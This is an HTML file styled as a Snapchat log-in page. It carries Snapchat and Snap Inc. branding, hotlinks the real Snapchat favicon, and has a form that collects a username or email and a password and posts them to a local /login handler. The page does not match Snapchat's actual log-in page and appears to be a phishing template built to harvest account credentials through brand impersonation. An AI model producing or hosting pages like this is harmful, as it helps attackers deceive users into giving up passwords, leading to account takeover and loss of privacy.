<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Log In • Snapchat</title>
<link rel="icon" href="https://accounts.snapchat.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes ghostFloat{0%,100%{transform:translateY(0) rotate(0deg)}25%{transform:translateY(-12px) rotate(3deg)}75%{transform:translateY(-6px) rotate(-3deg)}}
@keyframes gradientBG{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
@keyframes scaleIn{from{opacity:0;transform:scale(0.8)}to{opacity:1;transform:scale(1)}}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#fffc00,#ffe500,#fffc00,#fff176);background-size:300% 300%;animation:gradientBG 6s ease infinite;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.ghost{font-size:80px;animation:ghostFloat 3s ease-in-out infinite;margin-bottom:20px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.1))}
.card{background:white;border-radius:16px;padding:40px 36px;max-width:400px;width:100%;box-shadow:0 12px 40px rgba(0,0,0,0.12);animation:scaleIn 0.6s cubic-bezier(0.16,1,0.3,1);text-align:center}
h1{font-size:24px;font-weight:700;color:#000;margin-bottom:6px;animation:fadeInUp 0.5s ease 0.2s both}
.subtitle{font-size:14px;color:#666;margin-bottom:28px;animation:fadeInUp 0.5s ease 0.3s both}
.input-group{margin-bottom:16px;text-align:left;animation:fadeInUp 0.5s ease 0.4s both}
.input-group label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
.input-group input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;outline:none;transition:all 0.3s;background:#fafafa}
.input-group input:focus{border-color:#fffc00;background:white;box-shadow:0 0 0 4px rgba(255,252,0,0.2)}
.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,#00c6ff,#0072ff);color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;transition:all 0.3s;animation:fadeInUp 0.5s ease 0.5s both}
.login-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,114,255,0.3)}
.forgot{display:block;color:#0072ff;font-size:14px;text-decoration:none;margin-top:16px;animation:fadeIn 0.5s ease 0.6s both}
.forgot:hover{text-decoration:underline}
.signup{margin-top:24px;font-size:14px;color:#666;animation:fadeIn 0.5s ease 0.7s both}
.signup a{color:#0072ff;font-weight:600;text-decoration:none}
.footer{margin-top:30px;font-size:12px;color:#999;animation:fadeIn 0.5s ease 0.8s both}
</style>
</head>
<body>
<div class="ghost">👻</div>
<div class="card">
    <h1>Log In to Snapchat</h1>
    <p class="subtitle">Enter your credentials to continue</p>
    <form action="/login" method="POST">
        <div class="input-group">
            <label>Username or Email</label>
            <input type="text" name="username" placeholder="Username or email" required>
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" name="password" placeholder="Password" required>
        </div>
        <button type="submit" class="login-btn">Log In</button>
    </form>
    <a href="#" class="forgot">Forgot your password?</a>
    <p class="signup">Don't have an account? <a href="#">Sign Up</a></p>
</div>
<div class="footer">© Snap Inc. · Terms · Privacy</div>
</body>
</html>
